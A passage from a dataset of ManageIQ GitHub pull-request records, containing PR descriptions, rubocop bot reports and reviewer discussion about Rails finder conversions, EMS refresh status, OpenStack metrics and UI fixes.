7 - [Style/IndentationWidth](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/IndentationWidth) - Use 2 (not -8) spaces for indentation.\n- [ ] Style - [Line 275](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/app/models/ems_refresh/save_inventory_cloud.rb#L275), Col 5 - [Style/ElseAlignment](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/ElseAlignment) - Align `else` with `if`.\n\n**vmdb/spec/models/ems_refresh/refreshers/ec2_refresher_spec.rb**\n- [ ] Style - [Line 449](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/spec/models/ems_refresh/refreshers/ec2_refresher_spec.rb#L449), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [160/120]\n- [ ] Style - [Line 494](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/spec/models/ems_refresh/refreshers/ec2_refresher_spec.rb#L494), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for assert_specific_orchestration_stack_associations is too high. [26.31/15]\n- [ ] Style - [Line 510](https://github.com/bzwei/manageiq/blob/afced0e4a58a5961a7059fb11a7599530cc03a38/vmdb/spec/models/ems_refresh/refreshers/ec2_refresher_spec.rb#L510), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [133/120]\n', '@blomquisg I think this is good to merge. You want to review one more time?', ""WAIT. @bzwei I'm confused.  In your fog code you say that the fork changes are required, however this code does not use that fork code and it seems to pass fine.  Am I missing something?  If that fork is required can you please explicitly state that in the body of this PR and mark as WIP or Depends?"", 'This is AWS stuff, not requiring fog. When we come to OpenStack refreshing, fog is needed.', 'OOHHHHHH...I was so confused.']"
40,ManageIQ/manageiq,1351.0,"Note: this commit was required to be able to use arel_converter to mass convert some of the remaining rails 2 finders:  https://github.com/jrafanie/manageiq/commit/73968a0ca0ba5e09a8166281c2fb07ae492f634e

I can split this PR up if needed.","['This pull request is not mergeable.  Please rebase and repush.', '@Fryguy this is finally ready.. you might want to pass ?w=1 to ignore whitespace\r\n\r\ncc @tenderlove ', ""Note: I used https://github.com/jrafanie/arel_converter/tree/fixes which fixes/hacks some of the things that arel_converter wants to do like change `:a => :b to :a: :b` and a few others.  arel_converter easily had 50+ instances of finders in just the models directory that it couldn't parse properly.  Even then, it totally messes up on .all and .find(options_hash).  It does handle many common conversions properly."", 'This is amazing @jrafanie :heart_eyes: .', 'If you search the diff for `.where([` you can find a bunch of deletes for Useless `[]` on the where.', 'For reference, this is the superfluous [] example:\r\n\r\n```ruby\r\nirb(main):022:0> MiqProductFeature.where([""name = ?"", ""Delete""]).pluck(:name).take(2)\r\n=> [""Delete"", ""Delete""]\r\n```\r\n\r\nThe [] is not needed:\r\n\r\n```ruby\r\nirb(main):023:0> MiqProductFeature.where(""name = ?"", ""Delete"").pluck(:name).take(2)\r\n=> [""Delete"", ""Delete""]\r\n```\r\n', ""@Fryguy Finally went through everything.  Please review the last 7 commits starting with:\r\n\r\n* Remove superfluous [] .where([]) -> .where()\r\n\r\nIn general, I fixed the smaller :sparkles: :lipstick:  changes but left off the missing .includes from the original code. I also rewrote history on the paren bug in the ServerRole.database_scoped_roles method.\r\n\r\nLet me know if there's anything else that needs to be solved in this PR."", '@jrafanie Can you pluck mutiple columns in Rails 3.2?  I can\'t locally...\r\n\r\n```ruby\r\n[1] pry(main)> VmOrTemplate.limit(5).pluck([:id, :ems_ref])\r\n  SQL (0.9ms)  SELECT id, ems_ref FROM ""vms"" LIMIT 5\r\n=> [""vm-101616"", ""vm-1023"", ""vm-1024"", ""vm-112803"", ""vm-112805""]\r\n```\r\n\r\nEDIT: I only added the limit because I have like 200 VMs...it still breaks without the limit.', ""Fine, I'll back out all the plucks with multiple columns.\r\n\r\nhttp://meltingice.net/2013/06/11/pluck-multiple-columns-rails/"", 'Ok, @Fryguy @matthewd @tenderlove... anything else???', ':fire: in the hole!', ""@jrafanie This PR modifies calls to models backed by ActsAsArModel that do not support the newer calls.  Looks like we have 9 models that use that class.\r\n\r\nFor example:\r\n```\r\n[----] F, [2015-01-19T09:06:09.354127 #21209:3ffb85865be4] FATAL -- : Error caught: [NoMethodError] undefined method `pluck' for NetAppFiler:Class\r\n/Users/gmccullough/work/manageiq/vmdb/app/models/miq_provision_workflow.rb:778:in `allowed_datastore_storage_controller'\r\n```"", 'Thanks @gmcculloug, good times.  I""m thinking these need to be converted to ActiveModel since ActsAsArModel was our version of ActiveModel before there was an ActiveModel.', 'Short-time, we can see if we .select(:column).collect { |c| c.column} fixes the issue', 'cc @tenderlove ', ""@jrafanie Tested the select option in irb and that fails:\r\n```\r\nirb(main):001:0> NetAppFiler.select(:column).collect { |c| c.column}\r\nNoMethodError: private method `select' called for NetAppFiler:Class\r\n```\r\nI'm not worried about this one call as much as determining how to address all the other models/callers this effects.  If we convert these models to use ActiveModel do you know if that will address most of the issues?"", ""@gmcculloug I don't know about the details of ActiveModel.  @matthewd said in irc that it's not really covering the use cases that are added by ActsAsArModel so the short time would be to get ActsAsArModel to work with rails 3/4 finders and new methods.""]"
41,ManageIQ/manageiq,1410.0,"Parent issues: #1001, #1025","['Taking this one.', '@martinpovolny all fixed!', 'Checked commit https://github.com/skateman/manageiq/commit/197366eae3bc8e7961bd782ecfdd09097fffba36 with rubocop 0.27.1\n0 files checked, 0 offenses detected\nEverything looks good. :+1:\n']"
42,ManageIQ/manageiq,777.0,"Add ems refresh status

EMS Refresh Status consists of two new fields on `ext_management_system`:

* `last_refresh_error`: stores any error that occurred during the most recent refresh, nil if no error
* `last_refresh_date`:  stores the date of the most recent refresh

There is also a virtual column on `ExtManagementSystem` for showing the refresh status:

* `error`:   last_refresh_error is not nil
* `success`: last_refresh_error is nil and last_refresh_date is not nil
* `never`:   last_refresh_date is nil

For testing a failed refresh, a VCR cassette has been hand-edited to simulate a failing OpenStack Havana Refresh.

The only time a refresh is considered to fail (and therefore report an error) is when an exception occurs during the refresh process.  The exception information is stored in the `ExtManagementSystem#last_refresh_error` to indicate what error occurred during refresh.  After each refresh, the `last_refresh_date` is updated regardless of the error condition.","[""@blomquisg As discussed, let's separate out the refactoring of the refreshers into a separate PR.  Then, we can rebase this one on top of that."", '@fryguy, see #1161.', 'This pull request is not mergeable.  Please rebase and repush.', 'Looks good! :+1: Will wait for green.', '@dclarizio, I added UI elements for ems_refresh_status, can you review those changes?', ""Rebased/squashed, and I think I'll update the original PR comment, too.  I like the description I have in the first commit."", 'Looks good to me.   @dclarizio or @h-kataria can you just review the UI portion? ', '@blomquisg Code looks good . . . if you can drop in some screen shots, that would be great.', '@dclarizio will do.  Good suggestion!', '![ems-refresh-list-unknown-and-error](https://cloud.githubusercontent.com/assets/14183/5906451/b15ca9c0-a565-11e4-8dd2-251448fcd471.png)\r\n\r\nEms Cloud Provider List page showing two Cloud Providers.  **MIQ Amazon**\'s refresh status is ""unknown"" (or no inventory captured yet).  **QE Rhos**\' refresh status is an error.\r\n\r\n------\r\n\r\n![ems-refresh-details-error](https://cloud.githubusercontent.com/assets/14183/5906479/f5111796-a565-11e4-839e-db13cb368812.png)\r\n\r\nEms Cloud Provider Details page showing **QE Rhos**\' error status information.\r\n\r\n-----\r\n\r\n![ems-refresh-error-tooltip](https://cloud.githubusercontent.com/assets/14183/5906498/13aefab0-a566-11e4-8745-dcd5f3f15ab5.png)\r\n\r\nThe tooltip that shows up when hovering over the refresh status message.  (I couldn\'t get a screencap that showed this inline).\r\n\r\n-----\r\n\r\n![ems-refresh-list-unknown-and-success](https://cloud.githubusercontent.com/assets/14183/5906510/300c37ea-a566-11e4-8924-00bef8c3bb9e.png)\r\n\r\nEms Cloud Provider List page showing two Cloud Providers.  **MIQ Amazon**\'s refresh status is ""unknown"" (or no inventory captured yet).  **QE Rhos**\' refresh status is success.\r\n\r\n-----\r\n\r\n![ems-refresh-details-success](https://cloud.githubusercontent.com/assets/14183/5906517/3d824932-a566-11e4-99d4-259be2940d18.png)\r\n\r\nEms Cloud Provider Details page showing **QE Rhos**\' success status information.', '@blomquisg I think it would be nice if the error was included in the Last Refresh box, something like:\r\n` Error - 25 Minutes Ago: <Fog> excon....`', ""@dclarizio Sounds good.  I'll edit and rebase."", ""@dclarizio It's in the tooltip for the error line.  It can get pretty long."", ""@Fryguy I'm looking at some of the display options for the texual summary.  Looks like there's a multiline option.  I'll play with that and see if it works visually.  If it doesn't, then it should probably have something like:\r\n\r\n`Error - 2 min ago (hover for details)`"", ""@Fryguy @blomquisg It just didn't seem obvious from the screen shot how to see the error . . . perhaps we can truncate it if it's too long."", ""![ems-refresh-details-error-2](https://cloud.githubusercontent.com/assets/14183/5907967/676213ee-a571-11e4-967e-c280b302b082.png)\r\n\r\n@Fryguy, @dclarizio:  here's an example of using a multiline textual summary.\r\n\r\nKeep in mind that I'm sorta guessing at the error message.  We're just doing a `exception.to_s` to capture the error message.  So, it's possible that the exception message could be much longer than that.\r\n\r\n**EDIT**\r\nOh, the other benefit of having the error in the page and not tooltip only is for copy-paste."", ""Maybe use .truncate(n) on the error message.  That way the `...` from truncate will indicate there's more and to hover for more?"", ""I truncated to 120.  This particular error message is 111 chars, so it doesn't get truncated.  And, I feel that if an exception message can't convey something important in the first 120 chars, it's got other problems.\r\n\r\n120 chars is basically 2 lines of error message on my screen.  On severely lower resolution, I'm sure it will look worse."", 'Checked commits https://github.com/blomquisg/manageiq/commit/696c35a1e01733f1e82afc93b2e3c6758a965311 .. https://github.com/blomquisg/manageiq/commit/c4d0ec48f6e03aeaa06ebc5f8a73dad87d246369 with rubocop 0.27.1\n7 files checked, 0 offenses detected\nEverything looks good. :star:\n', 'Fixes #752 ']"
43,ManageIQ/manageiq,1228.0,"A service class to automatically create dialog based on an orchestration template.
The PR has dependency on PR #1212 ","['This pull request is not mergeable.  Please rebase and repush.', '@gmcculloug Can you please review this?', 'while you are in there, can you fixup the spec to not have the extra hash braces?\r\nLooks like it is just one file that has all those extra braces.', 'Checked commit https://github.com/bzwei/manageiq/commit/452eb0e705759ba814c3574307767074c47b667c with rubocop 0.27.1\n3 files checked, 5 offenses detected\n\n**vmdb/app/services/orchestration_template_dialog_service.rb**\n- [ ] Style - [Line 1](https://github.com/bzwei/manageiq/blob/452eb0e705759ba814c3574307767074c47b667c/vmdb/app/services/orchestration_template_dialog_service.rb#L1), Col 1 - [Metrics/ClassLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/ClassLength) - Class definition is too long. [125/100]\n\n**vmdb/spec/services/orchestration_template_dialog_service_spec.rb**\n- [ ] Style - [Line 49](https://github.com/bzwei/manageiq/blob/452eb0e705759ba814c3574307767074c47b667c/vmdb/spec/services/orchestration_template_dialog_service_spec.rb#L49), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [127/120]\n- [ ] Style - [Line 50](https://github.com/bzwei/manageiq/blob/452eb0e705759ba814c3574307767074c47b667c/vmdb/spec/services/orchestration_template_dialog_service_spec.rb#L50), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [144/120]\n- [ ] Style - [Line 69](https://github.com/bzwei/manageiq/blob/452eb0e705759ba814c3574307767074c47b667c/vmdb/spec/services/orchestration_template_dialog_service_spec.rb#L69), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [180/120]\n- [ ] Style - [Line 70](https://github.com/bzwei/manageiq/blob/452eb0e705759ba814c3574307767074c47b667c/vmdb/spec/services/orchestration_template_dialog_service_spec.rb#L70), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [164/120]\n']"
44,ManageIQ/manageiq,1594.0,,"['Checked commit https://github.com/romanblanco/manageiq/commit/6ccb4f9799bb57815e0997f450a8ded654aeeba7 with rubocop 0.27.1\n0 files checked, 0 offenses detected\nEverything looks good. :cake:\n', '<pr_mergeability_checker />This pull request is not mergeable.  Please rebase and repush.', '<pr_mergeability_checker />This pull request is not mergeable.  Please rebase and repush.', 'Hard to test the quick_search partial given you cannot save an advanced search because the advanced search drop-down is missing in master :-(. \r\n\r\n@epwinchell : you are on that one? (getting the advanced search button back?)', '```\r\n/home/martin/Projects/manageiq/vmdb/app/views/layouts/_protect.html.haml:15: syntax error, unexpected tSTRING_DEND, expecting \')\' ...odel, :notfound => :titleize))}"" ... ^ /home/martin/Projects/manageiq/vmdb/app/views/layouts/_protect.html.haml:16: syntax error, unexpected \',\', expecting \')\' ...>\\n <tr>\\n <td>\\n"", 3, false); ... ^ /home/martin/Projects/manageiq/vmdb/app/views/layouts/_protect.html.haml:26: syntax error, unexpected keyword_ensure, expecting tSTRING_DEND ...:Util.html_safe(_erbout);ensure;@haml_buffer = @haml_buffer.... ... ^ /home/martin/Projects/manageiq/vmdb/app/views/layouts/_protect.html.haml:26: syntax error, unexpected keyword_end, expecting tSTRING_DEND ...uffer.upper if @haml_buffer;end; ... ^ /home/martin/Projects/manageiq/vmdb/app/views/layouts/_protect.html.haml:29: syntax error, unexpected keyword_end, expecting tSTRING_DEND [vm_infra/x_button]\r\n```\r\n more testing needed; you should really find each piece in the UI\r\n(VM --> Policy --> Manage Policies)', '<rubocop />Checked commit https://github.com/romanblanco/manageiq/commit/33c0eb7915fcfbf46fbaaff52338958bef1296f0 with rubocop 0.27.1\n0 files checked, 0 offenses detected\nEverything looks good. :star:\n', '@martinpovolny , @h-kataria and I are converting the Search to bootstrap this Sprint. The button will be replaced when we get the PR in.']"
45,ManageIQ/manageiq,1584.0,"Fix metrics processing and calculation for both Openstack and
OpenstackInfra providers.

1. part of bug is that saved metrics weren't always in 20s
buckets or had holes. This has been simplified with mostly
delegating solution on Ceilometer.

2. part bug is aligning of multipler counters. Before
the samples of multiple counters weren't aligned, which
led to inaccurate calculation (e.g. when calculation is
sum of two samples, but there was only 1 present) and
not accurate intervals used for 'per s' calculations

Also adding new type of calculation where memory util is
computed from memory_total and memory_used. Shows nicely
aligning of the samples, cause for every calculation there
needs to have both memory_used and memory_total.

Fixes-issue: #1487
Fixes: https://bugzilla.redhat.com/show_bug.cgi?id=1148608

Depends on: ManageIQ#1392","['The commit ""Collect Host metrics for OpenstackInfra provider"" is in the pull request dependency ManageIQ#1392. So that needs to be merged first, then this pull request needs to be rebased to master. I haven\'t found another way how to create follow-up pull requests', '@blomquisg Please review.', 'Ok. Makes sense.\r\n\r\nBtw. is there already some place for these unit tests? I test it all only in capture specs now.', 'This pull request is not mergeable.  Please rebase and repush.', '@ladas, sorry it took so long to get around to pr #1392.  Can you rebase this?', ""@Fryguy hm your comment with :calculation key use Metric::Capture::Openstack.method(:method_name).to_proc seems to be lost now. :-) It's done nevertheless :-)\r\n\r\n@blomquisg it's rebased"", 'Are the two sets of specs identical?  If so, perhaps `shared_examples` would be better here', ""This looks really good, though admittedly, I don't understand it at all... @blomquisg Please review."", 'Also same comment as from the other PR...can you bug the BZ link in the commit message on its own line, so the bot can pick it up properly?', 'Additionally, can you change the Github issue line to `Fixes #1487`.  This is [Github syntax for autoclosing issues](https://help.github.com/articles/closing-issues-via-commit-messages/#closing-an-issue-in-the-same-repository)', ""@Fryguy Fixes changed.\r\n\r\n'Are the two sets of specs identical? If so, perhaps shared_examples would be better here'\r\nThere is a code that is almost identical, but it also tests different meters. So I decided to rather duplicate it a bit, so we have all meters covered.\r\n\r\nBut each meter is covered just once. I've put other scenarios to just OpenStack provider tests. But e.g. Infra has also special type of meter (computing util from total and used).\r\n\r\nI guess putting the common to shared might be confusing. Cause it is using meters either from Openstack or OpenstackInfra. (there are no common meters)\r\n"", 'Checked commit https://github.com/Ladas/manageiq/commit/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74 with rubocop 0.27.1\n5 files checked, 18 offenses detected\n\n**vmdb/app/models/metric/capture/openstack_infra.rb**\n- [ ] Style - [Line 59](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/capture/openstack_infra.rb#L59), Col 5 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] Style - [Line 86](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/capture/openstack_infra.rb#L86), Col 5 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n\n**vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb**\n- [ ] Style - [Line 122](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L122), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for collect_metrics_by_counter is too high. [18.79/15]\n- [ ] Style - [Line 149](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L149), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for process_statistics is too high. [20.25/15]\n- [ ] Style - [Line 171](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L171), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for process_single_counter_stats! is too high. [46.4/15]\n- [ ] Style - [Line 201](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for process_multi_counter_stats! is too high. [70.46/15]\n- [ ] Style - [Line 201](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/CyclomaticComplexity](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/CyclomaticComplexity) - Cyclomatic complexity for process_multi_counter_stats! is too high. [9/6]\n- [ ] Style - [Line 201](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/MethodLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/MethodLength) - Method has too many lines. [74/25]\n- [ ] Style - [Line 201](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/PerceivedComplexity](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/PerceivedComplexity) - Perceived complexity for process_multi_counter_stats! is too high. [13/7]\n- [ ] Style - [Line 201](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 35 - [Metrics/ParameterLists](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/ParameterLists) - Avoid parameter lists longer than 5 parameters.\n\n**vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb**\n- [ ] Style - [Line 538](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L538), Col 5 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [16.12/15]\n- [ ] Style - [Line 810](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L810), Col 5 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [16.12/15]\n- [ ] Style - [Line 928](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L928), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for make_calculation is too high. [22/15]\n- [ ] Style - [Line 928](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L928), Col 23 - [Metrics/ParameterLists](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/ParameterLists) - Avoid parameter lists longer than 5 parameters.\n\n**vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb**\n- [ ] Style - [Line 533](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L533), Col 5 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [16.12/15]\n- [ ] Style - [Line 808](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L808), Col 5 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [15.26/15]\n- [ ] Style - [Line 912](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L912), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for make_calculation is too high. [22/15]\n- [ ] Style - [Line 912](https://github.com/Ladas/manageiq/blob/cb25fa35aba7490d4d5e26c5b5ba4bf71fa19e74/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L912), Col 23 - [Metrics/ParameterLists](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/ParameterLists) - Avoid parameter lists longer than 5 parameters.\n', '@Ladas Ok, sounds good', ""I've gone over this code several times now.  I'm pretty sure I grok it at this point.\r\n\r\nThis is an impressive re-write!\r\n\r\nThe only part I haven't trudged through is the specs.  And, honestly, the proof will be in the coverage.  If the coverage is good, then I'm good with this (after the comments are addressed)."", '<rubocop />Checked commit https://github.com/Ladas/manageiq/commit/223bceaf0e844890b4e680e9108cb8ad30638145 with rubocop 0.27.1\n5 files checked, 18 offenses detected\n\n**vmdb/app/models/metric/capture/openstack_infra.rb**\n- [ ] :large_orange_diamond: - [Line 59](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/capture/openstack_infra.rb#L59), Col 5 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n- [ ] :large_orange_diamond: - [Line 86](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/capture/openstack_infra.rb#L86), Col 5 - [Style/AlignHash](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AlignHash) - Align the elements of a hash literal if they span more than one line.\n\n**vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb**\n- [ ] :large_orange_diamond: - [Line 122](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L122), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for collect_metrics_by_counter is too high. [18.79/15]\n- [ ] :large_orange_diamond: - [Line 149](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L149), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for process_statistics is too high. [20.25/15]\n- [ ] :large_orange_diamond: - [Line 171](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L171), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for process_single_counter_stats! is too high. [46.4/15]\n- [ ] :large_orange_diamond: - [Line 201](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for process_multi_counter_stats! is too high. [70.46/15]\n- [ ] :large_orange_diamond: - [Line 201](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/CyclomaticComplexity](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/CyclomaticComplexity) - Cyclomatic complexity for process_multi_counter_stats! is too high. [9/6]\n- [ ] :large_orange_diamond: - [Line 201](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/MethodLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/MethodLength) - Method has too many lines. [74/25]\n- [ ] :large_orange_diamond: - [Line 201](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 3 - [Metrics/PerceivedComplexity](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/PerceivedComplexity) - Perceived complexity for process_multi_counter_stats! is too high. [13/7]\n- [ ] :large_orange_diamond: - [Line 201](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/app/models/metric/ci_mixin/capture/openstack_base.rb#L201), Col 35 - [Metrics/ParameterLists](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/ParameterLists) - Avoid parameter lists longer than 5 parameters.\n\n**vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb**\n- [ ] :large_orange_diamond: - [Line 538](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L538), Col 5 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [16.12/15]\n- [ ] :large_orange_diamond: - [Line 810](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L810), Col 5 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for preload_data is too high. [16.12/15]\n- [ ] :large_orange_diamond: - [Line 928](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L928), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for make_calculation is too high. [22/15]\n- [ ] :large_orange_diamond: - [Line 928](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_infra_spec.rb#L928), Col 23 - [Metrics/ParameterLists](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/ParameterLists) - Avoid parameter lists longer than 5 parameters.\n\n**vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb**\n- [ ] :large_orange_diamond: - [Line 533](https://github.com/Ladas/manageiq/blob/223bceaf0e844890b4e680e9108cb8ad30638145/vmdb/spec/models/metric/ci_mixin/capture/openstack_spec.rb#L533), Col 5 - 